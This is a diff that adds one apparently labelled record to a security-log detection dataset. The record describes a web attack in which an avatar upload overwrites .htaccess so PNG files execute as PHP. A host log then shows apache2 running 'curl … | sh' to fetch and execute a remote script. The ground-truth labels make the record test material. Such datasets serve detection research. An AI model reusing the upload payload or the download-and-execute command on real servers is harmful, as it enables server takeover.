@@ -1,0 +1,33 @@
+{
+ "unit": 1059,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "上传接口覆盖 .htaccess 后触发命令",
+ "sources": [
+  "waf",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-10 18:20:21",
+   "source": "waf",
+   "log_id": "WAF0267606",
+   "content": "/api/upload/avatar filename=.htaccess&content=AddType application%2fx-httpd-php+png Mozilla/5.0 (Linux; Androi",
+   "event_id": "1059-WAF0267606"
+  },
+  {
+   "timestamp": "2026-06-10 18:21:19",
+   "source": "hids",
+   "log_id": "HID0290010",
+   "content": "curl -s http://10.20.7.31/px.sh | sh /bin/sh sh -c curl -s http://10.20.7.31/px.sh <== apache2",
+   "event_id": "1059-HID0290010"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
